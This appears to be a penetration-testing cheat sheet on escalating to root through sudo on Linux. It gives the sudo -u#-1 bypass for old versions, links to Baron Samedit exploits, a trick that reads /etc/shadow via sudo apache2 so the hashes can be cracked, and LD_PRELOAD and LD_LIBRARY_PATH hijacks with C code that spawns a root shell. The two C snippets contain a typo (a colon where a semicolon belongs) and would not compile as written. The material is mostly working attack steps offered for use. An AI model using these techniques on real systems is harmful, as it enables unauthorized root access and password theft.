# Sudo

## Vulnerable Versions
Get sudo version
```bash
sudo -V
```

### Sudo < 1.8.28
```
$ sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash


$ sudo -u#-1 /bin/bash
```

### CVE-2021-3156 (Sudo Baron Samedit)
Affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1 in their default configuration.
```
https://github.com/worawit/CVE-2021-3156
```

#### CVE-2021-3156 - Sudo 1.8.31 (no bruteforce)
```
https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit

```

## Apache as sudo
If we can run Apache as sudo, use apache2 to read /etc/shadow file:

```bash
/usr/bin/apache2

$ sudo apache2 -f /etc/shadow
Copy the hash and crack it.
```

## Environment Variable

```bash
$ sudo -l
env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

### LD_PRELOAD

Create the exploit:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0):
	system("/bin/bash -p");
}
```

Compile:

```c
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

Run any allowed program using sudo and the shared object created:

```bash
sudo LD_PRELOAD=/tmp/preload.so find
```

### LD_LIBRARY_PATH

Select one shared object to replace (one that sudo can run):

```bash
$ ldd /usr/sbin/apache2
...
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
```

Create the exploit:

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0):
	system("/bin/bash -p");
}
```

Compile:

```bash
gcc -fPIC -shared -nostartfiles -o libcrypt.so.1 library_path.c
```

Run any allowed program using sudo and the shared object created:

```bash
sudo LD_LIBRARY_PATH=. apache2
```